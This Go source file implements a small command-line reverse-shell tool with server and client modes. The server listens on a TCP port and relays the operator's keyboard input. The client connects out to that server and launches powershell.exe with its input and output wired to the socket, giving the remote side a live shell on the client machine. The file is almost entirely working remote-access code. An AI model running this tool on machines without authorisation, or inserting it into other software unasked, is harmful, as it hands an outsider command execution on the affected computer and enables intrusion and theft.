package main

import (
	"fmt"
	"io"
	"log"
	"os"

	"github.com/mang0kitty/tcpReverseShell/rsh"

	"github.com/urfave/cli/v2"
)

/**
S: start listening
S: wait for a client

-- s.Listen()

C: connect to the server
C: send "hello" to the server

-- c.Connect()
-- c.Send("hello")

S: receive "hello" from the client
S: send "hello" back to the client

-- d := s.Receive()
-- s.Send(d)

C: close
S: close
-- c.Close()
-- s.Close()
*/

func startServer(c *cli.Context) error {
	addr := c.String("addr")
	fmt.Printf("Listening on %s\n", addr)
	tcp, err := rsh.NewTCPServer(addr)
	if err != nil {
		return err
	}

	defer tcp.Close()

	// TODO: handle errors by shutting down the server + client
	go func() {
		io.Copy(tcp, os.Stdin)
	}()

	_, err = io.Copy(os.Stdout, tcp)
	return err
}

func startClient(c *cli.Context) error {
	addr := c.String("addr")
	fmt.Printf("Client connecting to %s\n", addr)
	tcp, err := rsh.NewTCPClient(addr)
	if err != nil {
		return err
	}

	defer tcp.Close()

	ps := rsh.AppRunner{
		Stdin:  tcp,
		Stdout: tcp,
	}

	err = ps.Execute("powershell.exe", "-NoExit", "-Command", "Write-Host 'This is a sub-shell'")

	if err != nil {
		log.Fatal(err)
	}

	return nil
}

func main() {
	app := &cli.App{
		Name: "rsh",

		Commands: []*cli.Command{
			&cli.Command{
				Name:  "server",
				Usage: "Runs an rsh server.",
				Flags: []cli.Flag{
					&cli.StringFlag{
						Name:  "addr",
						Value: "0.0.0.0:5555",
						Usage: "The address to listen on.",
					},
					&cli.StringFlag{
						Name:  "run",
						Value: "",
						Usage: "Specify a program to run on clients which connect to the server.",
					},
				},
				Action: startServer,
			},
			&cli.Command{
				Name:  "client",
				Usage: "Runs an rsh client.",
				Flags: []cli.Flag{
					&cli.StringFlag{
						Name:  "addr",
						Value: "127.0.0.1:5555",
						Usage: "the server to connect to",
					},
				},
				Action: startClient,
			},
		},
	}

	err := app.Run(os.Args)
	if err != nil {
		log.Fatal(err)
	}
}
